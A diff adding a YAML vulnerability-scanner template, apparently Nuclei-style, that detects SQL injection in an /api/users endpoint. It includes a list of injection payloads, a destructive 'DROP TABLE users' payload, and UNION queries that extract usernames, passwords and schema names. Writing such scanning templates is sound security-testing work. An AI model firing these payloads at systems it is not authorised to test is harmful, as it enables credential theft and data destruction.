@@ -1,0 +1,89 @@
+id: advanced-sqli-detection
+name: "Advanced SQL Injection Detection"
+severity: "critical"
+tags: [sqli, injection, advanced]
+description: |
+  综合演示：workflow + range + XPath + DSL
+  这是一个完整的 SQL 注入检测模板，使用workflow确保顺序执行。
+
+workflow:
+  # 步骤1：获取 CSRF token（使用 XPath 提取）
+  - name: "get-csrf"
+    http:
+      - raw: |
+          GET /api/login HTTP/1.1
+          Host: {{Hostname}}
+        extractors:
+          - name: "csrf_token"
+            type: "xpath"
+            xpath: ['//input[@name="csrf_token"]/@value']
+          - name: "session_id"
+            type: "cookie"
+        matchers:
+          - type: status
+            status: [200]
+
+  # 步骤2：测试 SQL 注入（使用 range 循环测试多个 payload）
+  - name: "test-sqli"
+    requires: ["get-csrf"]
+    http:
+      - raw: |
+          GET /api/users?id={{sqli_payload}} HTTP/1.1
+          Host: {{Hostname}}
+          X-CSRF-Token: {{csrf_token}}
+        range:
+          key: "sqli_payload"
+          values:
+            - "1' OR '1'='1"
+            - "1' AND '1'='1"
+            - "1 UNION SELECT 1,2,3--"
+            - "1; DROP TABLE users--"
+            - "' OR 1=1--"
+            - "1' AND SLEEP(5)--"
+            - "admin'--"
+            - "' OR 'x'='x"
+        extractors:
+          - name: "sql_error"
+            type: "xpath"
+            xpath: ['//body//*/text()[contains(., "SQL") or contains(., "syntax") or contains(., "error")]']
+          - name: "mysql_error"
+            type: "regex"
+            regex: ['MySQLSyntaxErrorException[:\s]+([^<]+)']
+          - name: "postgres_error"
+            type: "regex"
+            regex: ['ERROR[:\s]+([^<]+)']
+        matchers:
+          - type: dsl
+            dsl:
+              - "contains(sql_error, 'SQL')"
+              - "contains(sql_error, 'syntax')"
+              - "regex(mysql_error, '.+')"
+              - "regex(postgres_error, '.+')"
+          - type: status
+            status: [200]
+          - type: time
+            time: ">=1"
+
+  # 步骤3：验证注入点（仅当检测到注入时执行）
+  - name: "verify-sqli"
+    requires: ["test-sqli"]
+    http:
+      - raw: |
+          GET /api/users?id={{sqli_payload}}&detail=true HTTP/1.1
+          Host: {{Hostname}}
+        run-if: "len(sql_error) > 0"
+        range:
+          key: "sqli_payload"
+          values:
+            - "1' UNION SELECT username,password FROM users--"
+            - "1' UNION SELECT table_name,null FROM information_schema.tables--"
+            - "1' UNION SELECT column_name,null FROM information_schema.columns--"
+        matchers:
+          - type: word
+            words:
+              - "username"
+              - "password"
+              - "table_name"
+              - "column_name"
+          - type: status
+            status: [200]
